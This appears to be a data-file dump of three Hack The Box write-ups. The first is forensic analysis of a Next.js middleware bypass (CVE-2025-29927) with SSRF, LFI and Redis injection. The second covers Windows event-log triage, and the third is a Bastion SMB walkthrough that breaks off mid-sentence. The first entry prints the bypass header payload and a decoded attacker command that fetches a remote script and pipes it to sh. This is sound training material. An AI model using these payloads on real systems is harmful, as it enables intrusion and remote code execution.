        "title": "NeuroSync-D HTB Sherlock Challenge: Investigating Next.js Middleware Bypass and Redis Injection",
        "tags": ["linux","sherlock","DFIR","forensics","nextjs","react","CVE-2025-29927","redis injection","ssrf","lfi","redis",],
        "content": "NeuroSync-D Hack The Box Sherlock Challenge Writeup: https://app.hackthebox.com/sherlocks/NeuroSync-D Challenge Information: Difficulty: Easy Category: DFIR Scenario: NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it. Side Quest: What\u0026rsquo;s an N-Day? An N-day is a vulnerability that is already publicly known however a patch may not be available or the user has not been able to patch the flaw just yet. This is common as rolling out updates to large organizations and networks can be a slow process.\n1. Initial Analysis: Challenge Files: Files Provided: ├──  access.log ├──  bci-device.log ├──  data-api.log ├──  interface.log └──  redis.log Lets take a look at these files.\n1. interface.log Looking at the file interface.log file we can see there is a an application called neurosync@0.1.0 dev \u0026amp; it\u0026rsquo;s a Next.js app. We can also see it\u0026rsquo;s being run in development mode as the command next dev is used, naughty naughty.\n\u0026gt; neurosync@0.1.0 dev \u0026gt; next dev ▲ Next.js 15.1.0 - Local: http://localhost:3000 - Network: http://172.17.0.2:3000 - Experiments (use with caution): · webpackBuildWorker · parallelServerCompiles · parallelServerBuildTraces We can also see the Next.js version is 15.1.0 and it\u0026rsquo;s running on localhost \u0026amp; port 3000.\n2. Discovering the Application is Vulnerable to CVE-2025-29927: By searching the Next.js version we can see that this version is vulnerable to a middleware attack https://nvd.nist.gov/vuln/detail/CVE-2025-29927 Reading the description of the vulnerability we see the following:\nit is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.\n3. CVE-2025-29927 Explained: Luckily one of the vulnerability researchers, Rachid.A, created this lovely blog post detailing their process and the vulnerability. I will break it down here also, however I would recommend you read their post though as I will just give a high-level overview of the vulnerability, whereas there\u0026rsquo;s goes into greater depth.\nSide Quest: What is middleware?: Middleware acts as a checkpoint that runs before the application decides what information to serve a request. It will inspect the incoming request and then it will modify how the application responds, like redirecting, changing headers, cookie management or blocking/dropping a reqeuest plus many other things.\nHere are some basic examples of how middleware can be used in real world scenarios:\nAuth check:\n+For example+: A user tries to access an internal endpoint such as /user/settings the middleware will check for their session cookie and will then forward the request to the correct endpoint if permitted otherwise it may forward the request to /login if they aren\u0026rsquo;t logged in. Locale detection:\nRedirect users to a localized version of the site based on their browser\u0026rsquo;s language. Feature flags:\nShow different versions of a page depending on experimental settings (A/B testing). Rate limiting:\nBlock or throttle requests if too many come in from the same IP. Next.js\u0026rsquo;s middleware vulnerability: Next.js has it\u0026rsquo;s own middleware \u0026amp; I would recommend reading their documentation to get a broader understanding of how it works; however, I will provide an explanation below of why it was (is) vulnerable.\nThe runMiddleware function flaw: The runMiddleware function checks the value of the x-middleware-subrequest header, which is expected to be a colon-separated list of middleware names (hence the subreq.split(':') operation below ). Based on this, it determines whether a particular middleware should be applied.\n// Check the value of the header const subreq = params.request.headers[`x-middleware-subrequest`] //Splitting the header into a list. const subrequests = typeof subreq === \u0026#39;string\u0026#39; ? subreq.split(\u0026#39;:\u0026#39;) : [] If the current middleware\u0026rsquo;s name AKA middlewareInfo.name is already listed in subrequests, that means the middleware has already been invoked earlier in the request chain and should be skipped, and the request will be forwarded via the NextResponse.next() function and continue to the specified destination. (If you caught that you will know why that\u0026rsquo;s interesting, however lets\u0026rsquo; carry on). If the middleWareInfor.name is not listed in the subrequests the middleware is executed via the run() function, and its response is handled accordingly.\nif (subrequests.includes(middlewareInfo.name)) { result = { response: NextResponse.next(), waitUntil: Promise.resolve(), } continue } This logic was likely implemented to avoid redundant middleware execution and reduce overhead during internal subrequests, ultimately improving performance. However, the issue is. If an attacker can craft a request with the correct middleware name in the x-middleware-subrequest header, they can effectively bypass the middleware check. The server assumes the middleware has already been run and responds with NextResponse.next(), forwarding the request to its intended destination without reapplying the middleware logic.\nAs Rachid.A/Zhero states in his post.\nThe header and its value act as a universal key allowing rules to be overridden.\nDetermining where the \u0026ldquo;universal Key\u0026rdquo; is: For this attack to work the middlewareInfo.name (the middleware name) has to be known, however, for all intents and purposes this is pretty easy to guess as the middlewareInfo.name = the path where the middleware is located.\nAccording to the next.js documentation below.\nAs an alternative to having the special Next.js `app` or `pages` directories in the root of your project, Next.js also supports the common pattern of placing application code under the `src` folder.\n……..\nIf you\u0026rsquo;re using Middleware, ensure it is placed inside the `src` folder. We can see that the middleware should be placed in the src folder. So the payload ~would~ could be.\nx-middleware-subrequest: src/middleware However, according to the blogpost in later versions, the logic has changed slightly and the directory src may (not always) be omitted and the subrequests value (the header value once all values have been separated) must be greater then or equal to the predefined constant of (5) in the code.\nWhat does that mean in English, I hear your cry. All it means is the following either our payload is this.\nx-middleware-subrequest: middleware:middleware:middleware:middleware:middleware # Or our payload is this x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware Notice the amount of \u0026ldquo;middleware\u0026rdquo; entries is 5 which is equal to the hard-coded value of 5.\n+Note+: I know this seems like superfluous information, however once we get into the logs having this understanding of the vulnerability logic will enable you to understand what is going on in greater depth.\n4. Analyzing interface.log Further: So now we know how the vulnerability works we can check if the next.js application is vulnerable.\nIf we look at lines 28 \u0026amp; 29 of interface.log we can see that the /middleware folder which, unsurprisingly, contains the middleware was compiled, this would indicate it was accessed at this time as when in development mode next.js compiles routes, middleware, and components on-demand when first requested. This is to support hot reloading, faster startup, and incremental updates.\n○ Compiling /middleware ... ✓ Compiled /middleware in 1262ms (167 modules) We see that it was compiled due to someone trying to access the /api/bci/analytics endpoint. The lines are long so I will post a breakdown underneath so they are more legible.\n2025-04-01T11:37:58.163Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics 10.129.231.211: This is the IP of the client making the request. localhost:3000: This is the address the app is listening on internally inside the container or host environment (e.g., in a Docker container). The request is going to the endpoint: /api/bci/analytics. Headers of Interest:\n[\u0026#34;host\u0026#34;,\u0026#34;10.129.231.215\u0026#34;], [\u0026#34;x-forwarded-for\u0026#34;,\u0026#34;10.129.231.211\u0026#34;], [\u0026#34;x-real-ip\u0026#34;,\u0026#34;10.129.231.211\u0026#34;], [\u0026#34;x-forwarded-host\u0026#34;,\u0026#34;10.129.231.215\u0026#34;], [\u0026#34;x-forwarded-port\u0026#34;,\u0026#34;3000\u0026#34;], [\u0026#34;x-middleware-subrequest\u0026#34;,\u0026#34;middleware\u0026#34;], These headers tell us:\nhost: 10.129.231.215: This is the external IP/hostname the request was originally intended for before it was proxied to localhost:3000. x-forwarded-for: 10.129.231.211: The actual IP of the originating client. +Important+: As we have been informed that APT is moving laterally this indicates they have compromised host 10.129.231.211 and are making their requests from it. x-real-ip: 10.129.231.211: Same as above; often used for logging or app logic. x-forwarded-host and x-forwarded-port: Show the external-facing host and port. x-middleware-subrequest\u0026quot;,\u0026quot;middleware\u0026quot;: The middleware header. +Note+:\nThere are other headers however these are the most important ones for this. Each subsequent entry is the same however it just as an additional \u0026ldquo;middleware\u0026rdquo; argument in the header as all middleware routes were recursively compiled. Notes within notes: The \u0026ldquo;x-middleware-subrequest\u0026rdquo; header growing shows it\u0026rsquo;s likely recursively calling itself, either via NextResponse.rewrite() or misconfigured proxy logic, happy to be corrected etc if I am wrong. bloodstiller@bloodstiller.com Each subsequent line is just the requests made to the application e.g. PUT, GET etc.\nNow the above may not seem like it tells us much, however it tells us that middleware was active for the endpoint /api/bci/analytics so we can start looking for IOC\u0026rsquo;s in other logs by filtering for this endpoint.\n5. Cross-referencing Middleware Compilation Time Against access.log: If we look at the access.log we can see a list of all requests made.\nWe see the attackers fuzzed for the next.js files framework.js, main.js \u0026amp; common.js using the path /_next/static/chunks, however they received a 404 response. We can deduce this as the requests came from the compromised host 10.129.231.211.\nWe can then see they were able to access the following resources:\nmain-app.js at 11:37:44 page.js at 11:37:47 After which we see them access the /api/bci/analytics endpoint at 11:37:58.\nIf we cross reference this time against the interface.log file we can see that the compilation of the middleware began at 11:37:58. As mentioned before when in development mode middleware is compiled at execution time only, so we can safely assume this is the attackers.\n6. Finding The Middleware Bypass Time By Way of CVE-2025-29927 Exploitation: Looking at the access.log file we can also see the exact time the attackers bypassed the middleware by way of the vulnerable endpoint /api/bci/analytics. We can see that the previous attempts received a 401 GONE response however at 11:38:05 they received a 200 OK, signifying they successfully bypassed the middleware.\nAs we can see the previous attempts failed we can assume the payload below was the one successfully used to exploit this vulnerability:\nx-middleware-subrequest: middleware:middleware:middleware:middleware:middleware 7. SSRF Vulnerability \u0026amp; Internal Bruteforce: We are informed of the following.\nThe attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API.\nLooking at the data-api.log file we can see further IOC\u0026rsquo;s. The attacker is bruteforcing for endpoints on the internal API.\nIf we filter by using the following command we can see all the GET requests that come from local host 127.0.0.1\ncat data-api.log | grep 127 | grep GET | head 8. Discovering /logs Is Vulnerable to Local File Inclusion: We can see that eventually the attacker finds the endpoint /logs and they use to access logs.\nThey then perform a local file inclusion attack to read the /etc/passwd file.\n+Note+: The reason /etc/passwd is used is because it\u0026rsquo;s world readable so can be used as a good POC when testing for attacks like this. 9. Attacker Getting Access to secret.key: Looking further at the data-api.log file we can see the attacker were able to access the file secret.key in the /tmp directory.\nThe /tmp directory:\nThis directory is a standard location for storing temporary files, and its contents are cleared/deleted during system restarts. secret.key:\nThe filename suggests that the file contains sensitive piece of information potentially used for encryption, decryption, or authentication. As there were no longer any further LFI attacks uses once the secret.key file was discovered at 11:39:24 we can assume the attackers were able to leverage this information to again move laterally or further into the system.\n10. Redis Injection Attack: Looking at the redis.log we can see the below entry pushing to the redis db.\nLet\u0026rsquo;s break this down.\nAnalyzing the Redis Command Injection Payload: The full Redis command observed is structured as follows: \u0026#34;RPUSH\u0026#34; \u0026#34;bci_commands\u0026#34; \u0026#34;OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb\u0026#34; Here\u0026rsquo;s a breakdown of each part:\nRPUSH bci_commands [payload] This command pushes an entry into the Redis list named bci_commands. (It\u0026rsquo;s likely that a backend system reads from this queue and executes the incoming jobs.)\nThe payload structure follows this format.\nOS_EXEC|\u0026lt;base64_encoded_command\u0026gt;|\u0026lt;hash\u0026gt; OS_EXEC indicates that the payload should be executed on the host operating system. The second part is a Base64-encoded command. The final part is a hash (possibly used for integrity verification or authorization, however that is purely a guess) Decoding the Base64-Encoded Command: Let\u0026rsquo;s extract and decode the Base64 portion of the payload.\necho d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo | base64 -d This decodes to:\nwget http://185.202.2.147/h4Pln4/run.sh -O- | sh So this command downloads a remote shell script and pipes it directly into the shell, effectively executing arbitrary code on the system.\n11. Correlating Time Stamps \u0026amp; Discovering APT Server Location: Time Stamp Correlation: +Note+: This does not need to be done I am just doing it for comprehensiveness. If we correlate the above redis injection attack with the bci-device.log file we can see the payload in clear text.\n2025-04-01 11:39:26 BCI (Device): Executing OS command: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh 2025-04-01 11:39:26 BCI (Device): Command output: sh: 1: wget: not found This took place at 11:39:26. We can use https://www.unixtimestamp.com/ to convert the timestamp in the redis.log file and it\u0026rsquo;s at the same time (as expected)\nServer Location: If we check where this IP is located we can see it is located in Moskva, Russia.\n+Note+: Searching for \u0026ldquo;h4Pln4\u0026rdquo; in Google yield no results.\nLessons Learned: What did I learn? I actually learned alot about Node.js, I had some familiarity with it before but learned alot by reading the great article, which I will link again here . I personally find I learn a huge amount when breaking down CVE\u0026rsquo;s etc. It was fun to touch on redis injection as again this was something I was not hugely familiar with. What mistakes did I make? Just copy and paste friends, the amount of mistakes I made trying re-type something. Sign off: Remember, folks as always: with great power comes great responsibility. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller@bloodstiller.com ",

        "tags": ["Windows","sherlock","EVTX","forensics","Windows Logs","DFIR","1149","SmartScreen","1102","EvtxECmd","Timeline Explorer","Logs","RDP",],
        "content": "SmartyPants Hack The Box Sherlock Challenge Writeup: https://app.hackthebox.com/sherlocks/SmartyPants Challenge Information: Difficulty: Very Easy Category: DFIR Scenario: Forela\u0026rsquo;s CTO, Dutch, stores important files on a separate Windows system because the domain environment at Forela is frequently breached due to its exposure across various industries. On 24 January 2025, our worst fears were realised when an intruder accessed the fileserver, installed utilities to aid their actions, stole critical files, and then deleted them, rendering them unrecoverable. The team was immediately informed of the extortion attempt by the intruders, who are now demanding money. While our legal team addresses the situation, we must quickly perform triage to assess the incident\u0026rsquo;s extent. Note from the manager: We enabled SmartScreen Debug Logs across all our machines for enhanced visibility a few days ago, following a security research recommendation. These logs can provide quick insights, so ensure they are utilised. Files Provided: 358 Windows Event Logs +Important Note+: Only after completing this Sherlock purely with Event Viewer did I discover some very useful tools, EvtxECmd \u0026amp; Timeline Explorer , which would have made this easier. I would suggest using these tools, you can see how to set them in the end section Side Quest: Using EvtxECmd.exe \u0026amp; Timeline Explorer To Easily View Logs: Finding Initial Access Time: Windows Event ID 1149: We are told that \u0026ldquo;The attacker logged in to the machine where Dutch saves critical files, via RDP on 24th January 2025. Please determine the timestamp of this login.\u0026rdquo;\nWhich means we should filter for RDP login events. Looking at this post: https://woshub.com/rdp-connection-logs-forensics-windows/ \u0026amp; this post https://frsecure.com/blog/rdp-connection-event-logs/ we can find the following information:\nWhen there is a successful RDP logon to a computer this is logged as an 1149 event. (this is only true for OS\u0026rsquo;s later than Windows 7, \u0026amp; Windows Server 2012. All modern OS versions will log 1149 only if the username in the event was successfully authenticated. The event information also provides us the source IP of the connection which is useful.\nWe can see these events are logged in: \u0026ldquo;Microsoft -\u0026gt; Windows -\u0026gt; Terminal-Services-RemoteConnectionManager -\u0026gt; Operational\u0026rdquo; which is the file \u0026ldquo;Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx\u0026rdquo;\nIf we open this in event viewer and filter by event ID we can see the 1149 event listed.\nSo we can see from the event the attackers logged into the computer \u0026ldquo;CTO-FILESVR\u0026rdquo; at 10:15:14 on 24/01/2025.\nFinding Tools Using Microsoft Windows Defender SmartScreen: We are told: \u0026ldquo;The attacker downloaded a few utilities that aided them for their sabotage and extortion operation. What was the first tool they downloaded and installed?\u0026rdquo;\u0026quot;\nHack the box themselves have a great article about finding these IOC\u0026rsquo;s.\nhttps://www.hackthebox.com/blog/smartscreen-logs-evidence-execution We can also look at Microsoft\u0026rsquo;s official documentation:\nhttps://learn.microsoft.com/en-us/windows/security/operating-system-security/virus-and-threat-protection/microsoft-defender-smartscreen/ We can view when specific tools were executed as events are stored in:\n\u0026ldquo;Microsoft -\u0026gt; Windows -\u0026gt; SmartScreen -\u0026gt; Debug\u0026rdquo; \u0026quot;Microsoft-Windows-SmartScreen%4Debug.evtx\u0026quot; Side Quest: What is Microsoft Windows Defender SmartScreen? Windows Defender SmartScreen is an endpoint security tool designed to protect users from malware, phishing sides and malicious downloads/programs. It writes to the logs in real time as events occur.\nHow Microsoft Windows Defender SmartScreen Works: Microsoft Defender SmartScreen works by determining if a downloaded app or app installer is malicious by:\nChecking the downloaded files against known malicious software sites and unsafe. If a match is found, Microsoft Defender SmartScreen will show a warning to the user to tell them that the site/file may be malicious. It will also check the file against well known and frequently downloaded files. If the file isn\u0026rsquo;t on the list of well known files, Microsoft Defender SmartScreen will show a warning to the user cautioning them that the file could be malicious. Microsoft Defender SmartScreen works by determining if a site is malicious by:\nChecking the site and looking for indicators of suspicious behavior. If it determines the page could be suspicions, Microsoft Defender SmartScreen will show a caution warning to the user. It will also check the site against dynamically generated list of known \u0026amp; reported phishing sited and malicious software sites. If a match is found Microsoft Defender SmartScreen will show a caution warning to the user. How to Activate Microsoft Windows Defender Smartscreen: Just to make you aware this is disabled by default. It can be activated by running the below command:\nwevtutil sl Microsoft-Windows-SmartScreen/Debug /e:true Limitations of Microsoft Windows Defender Smartscreen: It only logs files accessed via the Windows GUI, e.g. from within the client or over RDP. Anything run or accessed via Powershell or CMD will not be recorded.\nDiscovering What Tools The Attacker Executed Using Microsoft Windows Defender SmartScreen Logs: Looking through the log we can see the following entry and can see that the tool WinRar was accessed from the C:\\Files directory at 10:17:27\nImmediately after this event we see they executed the tool \u0026ldquo;Everything.exe \u0026rdquo; which is a file search tool in C:\\\\Users\\\\Dutch\\\\Downloads\\\\Everything.exe at 10:17:33:\nDiscovering What Files The Attacker Accessed: There are also two more interesting entries here:\nWe can see the following pdfs were accessed:\nThe file Ministry Of Defense Audit.pdf located at \u0026ldquo;C:\\Users\\Dutch\\Documents\\2025- Board of directors Documents\\Ministry Of Defense Audit.pdf\u0026rdquo; was accessed at 10:19:00\nThe file 2025-BUDGET-ALLOCATION-CONFIDENTIAL.pdf located at \u0026ldquo;C:\\Users\\Dutch\\Documents\\2025- Board of directors Documents\\2025-BUDGET-ALLOCATION-CONFIDENTIAL.pdf\u0026rdquo; was accessed at 10:19:19\nDiscovering Cloud Tools Used By The Attacker Used to Exfiltrate Data: Looking further we can see the file the file MEGAsyncSetup64.exe was run at 10:20:05, this is a setup file for the cloud sync tool Mega . We can see it was also launched from the start menu at 10:22:19 as there is entry for accessing the MEGAsync.lnk file. Inferring An Exfiltration Timeline: We can see from the below screenshots that the attacker accessed cmd.exe at 10:20:35, then WinRAR.exe at 10:21:05 \u0026amp; then MEGAsync at 10:22:19. Which would indicate the attacker moved files at 10:20:35, compressed them at 10:21:05 \u0026amp; then exfiltrated them at 10:22:19. Discovering the Attacker Destroyed Logs: Event 1102 Log Clear: We can see at 10:26:40 the attacker installed the tool File Shredder which was likely used to cover their tracks by destroying logs. We can then see this tool was accessed at 10:27:09 Looking online we can see the event for clearing an audit log is event 1102\nhttps://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-1102 We can see from the picture these logs are stored in the Security log. If we load the Security.evtx we can filter for this log easily by doing the following:\nRight-click Security, then click Filter Current Log… In the \u0026ldquo;Event IDs\u0026rdquo; field, type: 1102 Click OK Side Quest: Using EvtxECmd.exe \u0026amp; Timeline Explorer To Easily View Logs: Only after completing this Sherlock did I discover the tools EvtxECmd \u0026amp; Timeline Explorer which would have made this ALOT easier. You can download pre-compiled binaries here: https://ericzimmerman.github.io/#!index.md +Note+: Both of these tools are made by Eric Zimmerman and I would encourage you to support his work if you do end up using these tools. You can do that on his github sponsor page . Easily Export Logs Using EvtxECmd: The description of the tool EvtxECmd is:\nEvent log (evtx) parser with standardized CSV, XML, and json output! Custom maps, locked file support, and more!\nIn English this means we can grab all of the exported .evtx files and then export them as CSV (can be opened in excel/libreoffice) or XML/JSON files.\nOnce you have downloaded the application you can do the export as follows. In this case I just poined it at the full directory of .evtx log files.\n.\\EvtxECmd.exe -d \u0026#34;[LocationOfLogs]\u0026#34; --[OutputFormat] \u0026#34;[DestintationOfOutput]\u0026#34; --[OutpufFileType] [OutputFileName].[Type] .\\EvtxECmd.exe -d \u0026#34;Z:\\SmartyPants\\Logs (2)\u0026#34; --csv \u0026#34;Z:\\SmartyPants\\Logs (2)\u0026#34; --csvf exported.csv Easily View A Timeline of logs using Timeline Explorer: Lessons Learned: What did I learn? I learned alot about using event viewer as I have never really used it before for manually filtering logs etc. I also learned about EvtxECmd \u0026amp; Timeline by Eric Zimmerman, which I am now adding to my arsenal of tools. What mistakes did I make? I went a while manually searching for event 1102 Log Clear before manually just filtering the logs. Sign off: Remember, folks as always: with great power comes great responsibility. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

    },

        "tags": ["Box","HTB","Easy","Windows","RPC","SSH","vhd","SMB","Hashcat","SAM","mRemoteNG","Guest Access","VHD Mounting","Password Recovery","Privilege Escalation",],
        "content": "Bastion Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Bastion How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\n#Command nmap $box -Pn -oA TCPbasicScan #Results ┌─(~/Dropbox/40-49_Career/44-Blog/bloodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Bastion/scans)─────(kali@kali:pts/9)─┐ └─(17:10:42 on main ✹ ✭)──\u0026gt; nmap $box -Pn -oA TCPbasicScan ──(Fri,Apr25)─┘ Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 17:10 BST Nmap scan report for 10.129.136.29 Host is up (0.019s latency). Not shown: 995 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman Initial thoughts: SSH RPC SMB Windows Remote Powershell (WSMAN) We will skip SSH \u0026amp; WSMAN initially and go after RPC \u0026amp; SMB as these are low hanging fruit. Comprehensive Scans: In depth scan TCP:\n#Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results ┌─(~/Dropbox/40-49_Career/44-Blog/bloodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Bastion/scans)─────(kali@kali:pts/9)─┐ └─(17:10:44 on main ✹ ✭)──\u0026gt; sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP ──(Fri,Apr25)─┘ [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 17:11 BST Nmap scan report for 10.129.136.29 Host is up (0.020s latency). Not shown: 65522 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Device type: general purpose Running: Microsoft Windows 2016 OS CPE: cpe:/o:microsoft:windows_server_2016 OS details: Microsoft Windows Server 2016 Network Distance: 2 hops Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2025-04-25T18:12:25+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s | smb2-time: | date: 2025-04-25T16:12:27 |_ start_date: 2025-04-25T16:08:16 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 92.42 seconds Findings: We can see from the name it\u0026rsquo;s called Bastion, it\u0026rsquo;s running Windows Server 2016 and it\u0026rsquo;s part of a workgroup so not part of AD environment. SMB 445: Accessing the Backups Share with the guest account: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold or at least information disclosure.\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares Well wouldn\u0026rsquo;t you know we can get access to the Backups directory and have READ,WRITE privs\nEnumerating SMB shares using netexec: As we can access the shares lets spider them for ease and check the results.\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; -M spider_plus Lets see if there is anything of note:\ncat /tmp/nxc_hosted/nxc_spider_plus/*.json We can see there is a file called \u0026ldquo;note.txt\u0026rdquo; in the share, we can see the other .txt file below it but it is 0 bytes so nothing.\n+Note+: There is other information regarding a windows image backup \u0026amp; a WindowsBackupImage directory, but we will look into that later. Using smbclient to access the Backups Share: Lets investigate this note.txt we can connect with SMBClient.\nsmbclient -U \u0026#39;guest\u0026#39; \u0026#34;\\\\\\\\$box\\\\Backups\u0026#34; We just hit enter for an empty password when prompted.\nLets download the note.txt file.\nget note.txt Looking at the note it\u0026rsquo;s a request to not transfer the backup file locally\nInvestigating the WindowsImageBackup directory: We can see the PC backed up has a hostname of L4mpje-PC\nWe can see it contains .vhd (Virtual Hard Disk) which will be interesting as we should be able to mount these and extract data.\nLets grab the smaller one to download locally \u0026amp; if we need to we can mount the larger one from the SMB share directly, whilst that is downloading lets have a further look around. We can see there are also various .xml files so we will grab those too.\nDiscovering GlobalCatalog backups: We can see there are copies/backups of the GlobalCatalog\nOverview of Global Catalog: It is a partial, read-only, searchable copy of all forest objects. It\u0026rsquo;s main function/purpose is it speeds up searches, especially in multi-domain environments. It will include full copy of current domain objects and partial copies of other domain objects. So we can actually learn alot from reading it.\nLets download them to our host:\nget BackupGlobalCatalog get GlobalCatalog Usually these would be ntds.dit format and we could run impacket-secretsdump on them however these appear to be a different format.\nThey come back as just standard Data type.\nRunning head on them to get the first 10 lines of each shows us there are some human readable strings but also gibberish binary data.\nhead BackupGlobalCatalog head GlobalCatalog Running strings on them doesn\u0026rsquo;t give us much more information.\nstrings GlobalCatalog | uniq Mounting the Smaller VHD Image: Now that the smaller of VHD\u0026rsquo;s has downloaded we should be able to mount it. We can use libguestfs-tools to do this.\nIf you don\u0026rsquo;t have it installed, you can install it easily.\nsudo apt-get install libguestfs-tools Next we create a mount point:\nmkdir /mnt/vmMount And attempt to mount it.\nguestmount --add 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vmMount We get the error below though, which means that an OS could not be found.\nUsing virt-filesystem to investigate further: Lets check what type of filesystem is on the host using virt-filesystems\nvirt-filesystems -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --long --parts --blkdevs --filesystems We can see there is an ntfs filesystem, which is expected as it\u0026rsquo;s Windows.\nLets manually mount the partition:\nsudo guestmount -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda --ro /mnt/vmMount Looking at the contents it does appear to just be the boot partition, so this is a dead-end.\nWe are going to mount the other larger volume, however first lets look at the xml files we have downloaded as they may contain valuable information too.\nReading The XML Docs: If we try and read the .xml files they appear they are binary data or just scrambled.\nThis is due to how windows encodes xml and other files using the UTF-16LE standard, which means we will need to decode them.\nSide Quest: What is UTF-16LE? UTF-16LE is a Unicode text encoding standard that uses 2 bytes (little-endian order) per character. It\u0026rsquo;s commonly used by Windows systems to store and represent text….\n\u0026ldquo;But what does that mean in English bloodstiller?\u0026rdquo;\nWell, glad you asked. UTF-16LE is how Windows stores text using two bytes per letter — it\u0026rsquo;s just one of several ways computers can save characters.\nThis means that Windows uses UTF-16LE (Little Endian) as its default internal encoding for a lot of things, especially:\nFile system metadata (like filenames on NTFS) Registry data Many Windows APIs that handle text Some exported files (like Office, old XML exports, etc.) When we see a .xml coming out of something Windows-related (like a backup, or exported metadata, or .docx/.xlsx internals), and it looks like every other byte is a 00, it\u0026rsquo;s almost always UTF-16LE.\nFor example we can run hexdump on a file and we will see the bytes.\nFun side-side quest: Notepad.exe in older Windows versions (like XP, 7) saved plain .txt files as UTF-16LE by default too unless it was manually changed. That\u0026rsquo;s why sometimes when you open an old Windows text file on Linux, it looks \u0026ldquo;weird\u0026rdquo; or has lots of spaces, it\u0026rsquo;s the null bytes from UTF-16LE encoding.\nConverting UTF-16LE to UTF8 so it\u0026rsquo;s readable using iconv: Luckily for us it\u0026rsquo;s easy to convert UTF-16LE encoded files into UTF-8 so we can easily read them on Linux, below are two options the first being piping straight into xml_pp which will make things look nicer and the second does the same but also outputs to a file.\n#Read file (we pipe into xml_pp so it\u0026#39;s pretty in the terminal) iconv -f UTF-16LE -t UTF-8 [file].xml | xml_pp #Convert file iconv -f UTF-16LE -t UTF-8 [file] | xml_pp \u0026gt; [file] Discovering There Sh be SSH Key\u0026rsquo;s Stored In The Backups: After looking through some of the files and finding 